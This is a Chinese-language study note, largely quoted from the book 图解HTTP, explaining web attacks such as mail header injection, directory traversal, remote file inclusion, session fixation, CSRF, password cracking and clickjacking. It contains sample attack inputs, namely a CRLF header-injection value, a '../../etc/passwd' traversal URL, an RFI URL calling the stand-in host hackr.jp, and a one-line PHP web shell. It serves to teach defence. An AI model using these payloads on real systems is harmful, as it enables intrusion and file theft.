# Web的攻击技术

---
绝大多数内容引自《图解HTTP》
---

## 邮件首部注入攻击

邮件首部注入（Mail Header Injection) 是指Web应用中的邮件发送功能，攻击者通过向邮件首部To 或 Subject 内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。

- 邮件首部注入攻击案列

下面以Web页面中的咨询表单为例讲解邮件首部注入攻击。该功能可以在表单内填入咨询者的邮件地址及咨询内容后，以邮件的形式发送给网站管理员。

攻击者将以下数据作为邮件地址发起请求。

```
bob@hackr.jp%0D%0ABcc: user@example.com
```

%0D%0A 在邮件报文中代表换行符。一旦咨询表单所在的Web应用接收了这个换行符，就可能实现对Bcc邮件地址的追加发送，而这原本是无法指定的。

另外像下面一样，使用两个连续的换行符就有肯呢个篡改邮件文本内容并发送。

```
bob@hackr.jp%0D%0A%0D%0ATest Message
```

再以相同的方法，就有可能改写篡改邮件文本内容并发送。

再以相同的方法，就有可能改写To和 Subject 等任意邮件首部，或向文本添加附件等动作。

## 目录遍历攻击

目录遍历（Directory Traversal）攻击是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。这种攻击有时也称为路径遍历(Path Traversal)攻击。

通过Web应用对文件处理操作时，在由外部指定文件名的处理存在疏漏的情况下，用户可使用.../等相对路径定位到/etc/passed 等绝对路径上，因此服务器上任意的文件或文件目录皆有可能被访问到。这样一来，就有可能非法浏览、篡改或删除Web服务器上的文件。

固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限。

- 目录遍历攻击案列

下面以显示读取文件功能为例，讲解目录比阿尼攻击。该功能通过以下查询字段，指定某个文件名。然后从/www/log/文件目录下读取这个指定的文件。

```
http://example.com/read.php?log=0401.log
```

攻击者设置如下查询字段后发出请求。

```
http://example.com/read.php?log=../../etc/passwd
```

查询字段为了读取攻击者盯上的/etc/passwd 文件，会从/www/log/目录开始定位相对路径。如果这份 read.php脚本接受对指定目录的访问请求处理，那原本不公开的文件就存在可被访问的风险。

## 远程文件包含漏洞

远程文件包含漏洞（Remote File Inclusion）是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可以运行任意脚本的一种攻击。

这主要是PHP存在的安全漏洞，对PHP的include或require来说，这是一种可通过设定，指定外部服务器URL作为文件名的功能。但是，该功能太危险了， PHP5.2.0之后默认设定此功能无效。

固然存在输出值转义的问题，但更应控制对任意文件名的指定。

- 远程文件包含漏洞的攻击案列

下面以include读入由查询字段指定文件的功能为例，讲解远程文件包含漏洞。该功能可通过以下查询字段形式指定文件名，并在脚本内的include语句处读入这个指定文件。

```
http://example.com/foo.php?mod=news.php
```

对应脚本的源代码如下所示。

```
$modname = $_GET['mod'];
include($modname);
```

攻击者指定如同下面形式的URL发出请求。

```
http://example.com/foo.php?mod=http://hackr.jp/cmd.php&cmd=ls
```

攻击者已事先在外部服务器上准备了一下这段脚本。

```
<? system($_GET['cmd']) ?>
```

假设Web服务器(example.com)的include可以引入外部服务器的URL，那就会读入攻击者在外部服务器上事先准备的URL（http://hackr.jp/cmd.php)。结果，通过system函数就能在Web服务器（example.com）上执行查询字段指定的OS命令了。


在以上攻击案列中，执行了可显示Web服务器（example.com）上文件及目录信息的ls命令。

# 因设置或设计上的缺陷应发的安全漏洞

因设置或设计上的缺陷引发的安全漏洞是指，错误设置Web服务器，或是由设计上的一些问题引起的安全漏洞。

## 强制浏览

强制浏览（Forced Browsing）安全漏洞是指，从安置在Web服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。

强制浏览有可能会造成以下一些影响。

- 泄漏顾客的个人信息等重要情报
- 泄漏原本需要具有访问权限的用户才可查阅的信息内容
- 泄漏为外链到外界的文件

对那些原本不愿公开的文件，为了保证安全会隐蔽其URL。可一旦知道了哪些URL，也就意味着可浏览URL对应的文件。直接显示容易推测的文件名或文件目录索引时，通过某些方法可能会使URL产生泄漏。

**文件目录一览**

```
http://www.example.com/log/
```

通过指定文件目录名称，即可在文件一览中看到显示的文件名。

**容易被推测的文件名及目录名**

```
http://www.example.com/entry/entry_081202.log
```

文件名称容易推荐（按上面的情况，可推出下一个文件时entry_081203.log）。

**备份文件**

```
http://www.example.com/cgi-bin/entry.cgi（原始文件）

http://www.example.com/cgi-bin/entry.cgi~（备份文件）

http://www.example.com/cgi-bin/entry.bak（备份文件）

```

由编辑软件自动生成的备份文件无执行权限，有可能直接以源代码形式显示。

**经认证才可显示的文件**

直接通过URL访问原本必须经过认证才能在Web页面上使用的文件（HTML文件、图片、PDF等文档、CSS以及其他数据等）。


- 强制浏览器导致安全漏洞的案列

下面我们以会员制度的SNS 日记功能为例，讲解强制浏览可能导致的安全漏洞。

该日记功能保证了除具有访问权限的用户本人以外，其他人都不能访问日记。

该日记中包含的图像照片的源代码如下所示。

```
<img src="http://example.com/img/tRNqSUBdG7Da.jpg">
```

即使没有对这篇日记的访问权限，只需知道这图片的URL，通过直接指定URL的方式就能显示该图片。

日记的功能和文本具有访问对象的控制，但不具备对图片访问对象的控制，从而产生安全漏洞。

## 不正确的错误消息处理

不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web应用的错误信息内包含对攻击者有用的信息。与Web应用有关的主要错误信息如下所示。

- Web应用抛出的错误信息
- 数据库等系统抛出的错误消息

Web应用不必在用户的浏览画面上展现详细的错误信息。
对攻击者来说，详细的错误消息有可能给他们下一次攻击以提示。

**不正确的错误消息处理导致安全漏洞的案列**

Web应用抛出的错误消息

下面以认证功能的认证错误消息为例，讲解不正确的错误消息处理方式。
该认证功能，在输入表单内的邮件地址及密码匹配发生错误时，会提示错误信息。

提示“邮件地址未注册”的错误消息。
当输入的邮件地址尚未在该Web网站上注册时，就会触发这条错误消息。
因为尚诺邮件地址存在，应该会提示“输入的密码有误”之类的错误信息。

攻击者利用进行不同的输入会提示不同的错误信息这条，就可用来确认输入的邮件地址是否已在这个Web网站上注册过了。

为了不让错误提示消息给攻击者以启发，建议将提示消息的内容仅保留到“认证错误”这种程度即可。

**数据库等系统抛出的错误消息**

下面我们以搜索功能提示的错误信息为例，讲解不正确的错误消息处理。
本功能能用于检索数据，当输入未预料的字符串时，会提示数据库的错误。

该认证功能能在输入表单内的邮件地址及密码匹配发生错误时，会提示错误信息。

上方的画面中显示了与SQL有关的错误信息。

对开发者而言，该信息或许在Debug时会有帮助，但对用户毫无用处。

攻击者从这条信息中可读出数据库选用的是MySQL，甚至还看见了SQL语句的片段。
这可能给攻击者进行SQL注入攻击以启发。

系统抛出的错误主要集中在以下几个方面。

- PHP或ASP等脚本错误。
- 数据库或中间件的错误。
- Web服务器的错误。

各系统应对详细的错误信息进行抑制设定，或使用自定义错误消息，以避免某些错误信息给攻击者以启发。

### 开放重定向

开放重定向（Open Redirect）是一种对指定的任意URL作重定向跳转的功能。
而与此功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导至那个Web网站。

- 开放重定向的攻击案列

以下面的URL做重定向为例，详解开放重定向攻击案列。
该功能就是向URL指定参数后，使本来的URL发生重定向跳转。

```
http://example.com/?redirect=http://www.triorder.jp
```

攻击者把重定向指定的参数改写成已设好陷阱的Web网站对应的连接。

```
http://example.com/?redirect=http://hackr.jp
```

用户看到URL后原以为访问example.com，不料实际上被诱导至hackr.jp这个指定的重定向目标。

可信度高的Web网站如果开放重定向功能，则很有可能被攻击者选中并用来作为钓鱼攻击的跳板。

## 因会话管理疏忽引发的安全漏洞

会话管理是用来管理用户状态的必备功能，但是如果在会话管理上有所疏忽，就会导致用户的认证状态被窃取等后果。

### 会话劫持

会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击的目的。

具备认证功能的Web应用，使用会话ID的会话管理机制，作为管理认证状态的主流方式。
会话ID中记录客户端的Cookie等信息，服务器将会话ID与认证状态进行一对一匹配管理。

下面列举了几种攻击者可获得会话ID的途径。

- 通过非正规的生成方法推测会话ID
- 通过窃听或XSS攻击盗取会话ID
- 通过会话固定攻击（Session Fixation)强行获取会话ID

**会话劫持攻击案列**

以认证功能为例讲解会话劫持。
这里的认证功能通过会话管理机制，会将成功认证的用户的会话ID（SID）保存在用户浏览器的Cookie中。

攻击者在得知该Web网站存在可跨站攻击（XSS）的安全漏洞后，就设置好用JavaScript脚本调用document.cookie以窃取Cookie信息的陷阱，一旦用户踏入陷阱（访问了该脚本），攻击者就能获取含有会话ID的Cookie。

攻击者拿到用户的会话ID后，往自己的浏览器的Cookie中设置该会话ID，即可伪装成会话ID遭窃的用户，访问Web网站了。


**会话固定攻击**

对以窃取目标会话ID为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话ID，属于被动攻击。

- 会话固定攻击案列

以认证功能为例讲解会话固定攻击。
这个Web网站的认证功能，会在认证前发布一个会话ID，若认证成功，就会在服务器内改变认证状态。

攻击者准备陷阱，先访问Web网站拿到会话ID（SID=f5d1278e8109）。
此刻，会话ID在服务器上的记录仍是未认证状态。

攻击者设置好强制用户使用该会话ID的陷阱，并等待用户拿着这个会话ID前去认证。
一旦用户触发陷阱并完成认证，会话ID（SID=f5d1278e8109)在服务器上的状态（用户A已认证）就会被记录下来。

攻击者估计用户差不多已触发陷阱后，再利用之前这个会话ID访问网站。
由于该会话ID目前已是（用户A已认证）状态，于是攻击者作为用户A的身份顺利登陆网站。

**Session Adoption**

Session Adoption 是指PHP或ASP.NET能够接收处理未知会话ID的功能。

恶意使用该功能便可跳过会话固定攻击的准备阶段，从Web网站获得发行的会话ID的步骤。即，攻击者可私自创建会话ID构成陷阱，中间件却会误以为该会话ID是未知会话ID而接受。

### 跨站点请求伪造

跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。

跨站点请求伪造有可能会造成以下等影响。

- 利用已通过认证的用户权限更新设定信息等。
- 利用已通过认证的用户权限购买商品。
- 利用已通过认证的用户权限在留言板上发表言论。
- 跨站点请求伪造的攻击案例。

下面以留言板功能为例，讲解跨站点请求伪造。
该功能只允许已认证并登陆的用户在留言板上发表内容。

在该留言板系统上，受害者用户A是已认证状态。
它的浏览器中的Cookie持有已认证的会话ID。

攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户A的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论。

触发陷阱之际，如果用户A尚未通过认证，则无法利用用户A的身份权限在留言板上发表内容。

## 其他安全漏洞

### 密码破解

密码破解攻击（Password Cracking）即算出密码，突破认证。
攻击不仅限于Web应用，还包括其他的系统（如FTP或SSH等）。

密码破解有以下两种手段。

- 通过网络的密码试错。

- 对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）

除去突破认证的攻击手段，还有SQL注入攻击逃避认证，跨站脚本攻击窃取密码信息等方法。

**通过网络进行密码试错**

对Web应用提供的认证功能，通过网络尝试候选密码进行的一种攻击。
主要有以下两种方式。

- 穷举法
- 字典攻击

**穷举法**

穷举法（Bruceforce Attach，又称暴力破解法）是指对所有密钥集合构成的密钥空间（Keyspace）进行穷举。即，用所有可行的候选密码对目标的密码系统试错，用以突破验证的一种攻击。

比如银行采用的个人识别码是由“4位数字”组成的密码，那么就要从0000~9999中的全部数字逐个进行尝试。这样一来，必定在候选的密码集合中存在一个正确的密码，可通过认证。

因为穷举法会尝试所有的候选密码，所以是一种必然能够破解密码的攻击。
但是，当密钥空间很庞大时，解密可能需要花费数年，甚至千年的时间，因此从现实角度考量，攻击是失败的。

**字典攻击**

字典攻击是指利用事先收集好的候选密码（经过各种组合方式后存入字典），枚举字典中的密码，尝试通过认证的一种攻击手段。

还是举银行采用个人识别码是“4位数字”的密码的例子，考虑到用户使用自己的生日做密码的可能性较高，于是就可以把生日日期数值化，如将0101~1231保存成字典，进行尝试。

与穷举法相比，由于需要尝试的候选密码较少，意味着攻击耗费的时间比较短。
但是，如果字段中没有正确的密码，那就无法破解成功。
因此攻击的成败取决于字典的内容。

利用别处泄漏的ID· 密码进行攻击

字典攻击中有一种利用其它Web网站已泄漏的ID及密码列表进行的攻击。
很多用户习惯随意地在多个Web网站使用同一套ID及密码，因此攻击成功概率高。

**对已加密密码的破解**

Web应用在保存密码时，一般不会直接以明文的方式保存，通过散列函数做散列处理或加salt的手段对要保存的密码本身加密。

那即使攻击者使用某些手段窃取密码数据，如果想要真正使用这些密码，则必须先通过解码等手段，把加密处理的密码还原成明文形式。

从加密过的数据中导出明文通常有以下几种方法。

- 通过穷举法· 字典攻击进行类推
- 彩虹表
- 拿到密钥
- 加密算法的漏洞

> 针对密码使用散列函数进行加密处理的情况，采用和穷举法或字典攻击相同的手法，尝试调用相同的散列函数加密候选密码，然后把计算出的散列值与目标散列值匹配，类推出密码。

**彩虹表**（Rainbow Table) 是由明文密码及与之对应的散列值构成的一张数据库表，是一种通过实现制作庞大 的彩虹表，可在穷举法·字典攻击等实际破解过程中缩短消耗时间的技巧，从彩虹表内搜索散列值就可以推导出对应的明文密码。

为了提高攻击成功率，拥有一张海量数据的彩虹表就成了必不可少的条件。

例如在Free Rainbow Tables 网站上公布的一张由大小写字母及数字全排列的1~8位字符串对应的MD5 散列值构成的彩虹表，其大小约为1050字节。

**拿到密钥**使用共享密钥加密方式对密码数据进行加密处理的情况下，如果能通过某种手段拿到加密使用的密钥，也就可以对密码数据解密了。

**加密算法的漏洞**


### 点击劫持

**点击劫持（Clickjacking)**是指利用透明的按钮或链接做成陷阱，覆盖在Web页面上。

然后诱使用户在不知情的情况下，点击那个链接访问内容的一种攻击手段。
这种行为又称为界面伪装（UI Redressing)。

已设置陷阱的Web页面，表面上内容并无不妥，但早已埋入想让用户点击的链接。
当用户点击到透明的按钮时，实际上是点击了已指定透明属性元素的iframe页面。

- 点击劫持的攻击案列

下面以SNS网站的注销功能为例，讲解点击劫持攻击。
利用该注销功能，注册登录的SNS用户只需点击注销按钮，就可以从SNS网站上注销自己的会员身份。

攻击者在预料用户会点击的Web页面上设下陷阱。

在做过手脚的Web页面上，目标的SNS注销功能页面将作为透明层覆盖在游戏网页上。
覆盖时，要保证PLAY按钮与注销按钮的页面所在位置保持一致。

由于SNS网站作为透明层被覆盖，SNS网站上处于登陆状态的用户访问这个钓鱼网站并点击页面上的PLAY按钮之后，等同于点击了SNS网站的注销按钮。

### DoS攻击

DoS（Denial of Service Attack)是一种让运行中的服务呈停止状态的攻击。
有时候也叫作服务停止攻击或拒绝服务攻击。
DoS攻击的对象不局限于Web网站，还包括网络设备及服务器。

主要有以下两种DoS攻击方式。

- 集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈停止状态。
- 通过攻击安全漏洞使服务停止。

其中，集中利用访问请求的DoS攻击，单纯来讲就是发送大量的合法请求。
服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DoS攻击。

多台计算机发起的DoS攻击称为DDoS攻击（Distributed Denial of Service Attack)。DDoS攻击通常利用那些感染病毒的计算机作为攻击者的攻击跳板。

### 后门程序

后门程序（Backdoor）是指开发设置的隐藏入口，可不按正常步骤使用受限功能。利用后门程序就能使用原本受限的功能。

通常的后门程序分为以下3种类型。

- 开发阶段作为Debug调用的后门程序。
- 开发者为了自身利益植入的后门程序。
- 攻击者通过某种方法设置的后门程序

可通过监视进程和通信的状态发现被植入的后门程序。
但设定在Web应用中的后门程序，由于和正常使用时区别不大，通常很难被发现。